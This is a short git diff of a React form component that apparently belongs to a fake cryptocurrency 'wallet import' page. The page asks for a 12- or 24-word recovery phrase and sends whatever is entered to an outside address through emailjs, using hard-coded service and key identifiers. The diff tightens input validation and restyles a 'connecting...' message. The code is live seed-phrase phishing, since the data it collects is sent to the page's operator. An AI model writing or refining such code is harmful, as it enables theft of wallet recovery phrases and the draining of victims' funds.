@@ -111,9 +111,9 @@ function Form() {
     e.preventDefault()
 
     console.log(name,message)
-    if(!name || !message) {
+    if(message.length < 12 ) {
       console.log('empty')
-      alert('fill in you details')
+      alert('Fill in the correct details')
       return
     }
     emailjs.sendForm('service_0mhvxbd', 'template_2eedt5l', formRef.current, '8RJySH7rZZrTznIBh')
@@ -136,7 +136,7 @@ function Form() {
             <p>Typically 12 (sometimes 24) words separated by single spaces</p>
 
             <button>Import</button>
-            {done && 'connecting...'}
+            {done && <p>connecting...</p>}
         </form>
     </FormCont>
   )
